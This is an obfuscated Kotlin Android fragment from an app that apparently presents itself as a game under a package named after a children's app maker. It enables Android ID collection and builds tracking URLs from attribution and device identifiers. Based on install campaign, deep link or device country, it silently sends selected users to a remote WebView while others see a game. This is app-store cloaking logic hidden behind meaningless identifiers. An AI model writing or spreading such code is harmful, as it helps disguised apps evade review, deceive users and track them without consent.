package com.sinyee.baby

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.sinyee.baby.cococnsnns.Util.PAAPAPAPAgtgt
import com.sinyee.baby.cococnsnns.Util.ad_idgtgt
import com.sinyee.baby.cococnsnns.Util.appsggttg
import com.sinyee.baby.cococnsnns.Util.aps_idgtgtgt
import com.sinyee.baby.cococnsnns.Util.codeCodegttgtg
import com.sinyee.baby.cococnsnns.Util.geoCogtgt
import com.sinyee.baby.cococnsnns.Util.instIdggttg
import com.sinyee.baby.cococnsnns.Util.keyVAlgtgt
import com.sinyee.baby.cococnsnns.Util.linkaagtgt
import com.sinyee.baby.cococnsnns.Util.myIdggtgt
import com.sinyee.baby.cococnsnns.Util.namm
import com.sinyee.baby.cococnsnns.Util.onegttgtg
import com.sinyee.baby.cococnsnns.Util.subFive
import com.sinyee.baby.cococnsnns.Util.subFour
import com.sinyee.baby.cococnsnns.Util.gttggtgthy
import com.sinyee.baby.cococnsnns.Util.subSixgtgtggt
import com.sinyee.baby.cococnsnns.Util.trololo
import com.sinyee.baby.cococnsnns.Util.urlMaingttgtg
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named

class FillllyllyylylFragment : Fragment() {

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fillllyllyylyl, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val gthyhyyh = shareP.getString(geoCogtgt, null)
        val appCampgttggt = shareP.getString("appCamp", null)
        val deepStgtgt = shareP.getString("deepSt", null)

        val intentBeamgtgt = Intent(activity, VebVActivity::class.java)
        val intentGamegtgt = Intent(activity, GamerActivity::class.java)

        val countryDevgtgt = shareP.getString(codeCodegttgtg, null)
        val appsgtgt = shareP.getString(appsggttg, null)
        val wv56 = shareP.getString(urlMaingttgtg, null)
        val mainId6565 = shareP.getString("mainId", null)
        val packgtgt = PAAPAPAPAgtgt
        val buildVersgtgt = Build.VERSION.RELEASE
        val myTrIdgtgt = shareP.getString(myIdggtgt, null)
        val myInstId: String? = shareP.getString(instIdggttg, null)



        val afIdgtgt = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_idgtgtgt, afIdgtgt).apply()

        Log.d("lolo", "count ${gthyhyyh}")
        Log.d("lolo", "countryDev ${countryDevgtgt}")
        Log.d("lolo", "apps ${appsgtgt}")

        val linkAppsgtgtgt = "$wv56$gttggtgthy$appCampgttggt&$onegttgtg$afIdgtgt&$ad_idgtgt$mainId6565&$subFour$packgtgt&$subFive$buildVersgtgt&$subSixgtgtggt$namm"
        val gtgtgtgt = "$wv56$onegttgtg$myTrIdgtgt&$ad_idgtgt$myInstId&$subFour$packgtgt&$subFive$buildVersgtgt&$subSixgtgtggt$namm"
        val linkFBgtgtgt5 = "$wv56$gttggtgthy$deepStgtgt&$onegttgtg$afIdgtgt&$ad_idgtgt$mainId6565&$subFour$packgtgt&$subFive$buildVersgtgt&$subSixgtgtggt$trololo"
        val linkFBNullAppsgtgt = "$wv56$gttggtgthy$deepStgtgt&$onegttgtg$myTrIdgtgt&$ad_idgtgt$myInstId&$subFour$packgtgt&$subFive$buildVersgtgt&$subSixgtgtggt$trololo"

        when(appsgtgt) {
            "1" ->
                if(appCampgttggt!!.contains(keyVAlgtgt)) {
                    shareP.edit().putString(linkaagtgt, linkAppsgtgtgt).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeamgtgt)
                    activity?.finish()
                } else if (deepStgtgt!=null||countryDevgtgt!!.contains(gthyhyyh.toString())) {
                    shareP.edit().putString(linkaagtgt, linkFBgtgtgt5).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeamgtgt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgt)
                    activity?.finish()
                }
            "0" ->
                if(deepStgtgt!=null) {
                    shareP.edit().putString(linkaagtgt, linkFBNullAppsgtgt).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeamgtgt)
                    activity?.finish()
                } else if (countryDevgtgt!!.contains(gthyhyyh.toString())) {
                    shareP.edit().putString(linkaagtgt, gtgtgtgt).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeamgtgt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgt)
                    activity?.finish()
                }
        }
    }

    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }

}